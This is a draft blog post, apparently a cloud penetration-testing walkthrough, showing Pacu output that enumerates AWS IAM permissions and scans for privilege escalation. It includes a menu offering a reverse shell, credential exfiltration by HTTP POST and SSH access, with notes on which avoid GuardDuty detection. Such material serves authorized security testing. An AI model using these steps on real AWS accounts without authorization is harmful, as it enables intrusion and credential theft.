---
title: Testing AWS Infra with PACU
date: 2024-10-26
tags:
  - cloud
draft: true
image: /img/rhino_pacu[banner].png
layout: blog-post
---
### Pairing Policies Together

![image](/img/aws_pacu_[power_user_group].png)

### Enumerating Permissions

{{< highlight bash "linenos=inline,hl_lines=0,linenostart=1" >}}
Pacu (pacu:None) > run iam__enum_permissions
[iam__enum_permissions] MODULE SUMMARY:

  845 Confirmed permissions for user: pacu.
    0 Confirmed permissions for 0 role(s).
    0 Unconfirmed permissions for 0 user(s).
    0 Unconfirmed permissions for 0 role(s).
{{< / highlight >}}

### Escalation of Privilege

{{< highlight bash "linenos=inline,hl_lines=1 13 14 22,linenostart=1" >}}

Pacu (pacu:None) > run iam__privesc_scan
  Running module iam__privesc_scan...
[iam__privesc_scan] Escalation methods for current user:
[iam__privesc_scan]   CONFIRMED: CreateEC2WithExistingIP
[iam__privesc_scan]   CONFIRMED: PassExistingRoleToNewDataPipeline
[iam__privesc_scan] Attempting confirmed privilege escalation methods...

[iam__privesc_scan]   Starting method CreateEC2WithExistingIP...

[iam__privesc_scan]     Targeting region ca-central-1...
[iam__privesc_scan]   Found multiple instance profiles. Choose one below. Only instance profiles with roles attached are shown.

[iam__privesc_scan]   [0] AWSCloud9SSMInstanceProfile
[iam__privesc_scan]   [1] IAM_Reader
[iam__privesc_scan] What instance profile do you want to use? 0
[iam__privesc_scan] Ready to start the new EC2 instance. What would you like to do?
[iam__privesc_scan]   1) Open a reverse shell on the instance back to a server you control. Note: Restart the instance to resend the reverse shell connection (will not trigger GuardDuty, requires outbound internet).
[iam__privesc_scan]   2) Run an AWS CLI command using the instance profile credentials on startup. Note: Restart the instance to run the command again (will not trigger GuardDuty, requires outbound internet).
[iam__privesc_scan]   3) Make an HTTP POST request with the instance profiles credentials on startup. Note: Restart the instance to get a fresh set of credentials sent to you(will trigger GuardDuty finding type UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration when using the keys outside the EC2 instance, requires outbound internet).
[iam__privesc_scan]   4) Try to create an SSH key through AWS, allowing you SSH access to the instance (requires inbound access to port 22).
[iam__privesc_scan]   5) Skip this privilege escalation method.
[iam__privesc_scan] Choose one [1-5]: [iam__privesc_scan]
{{< / highlight >}}



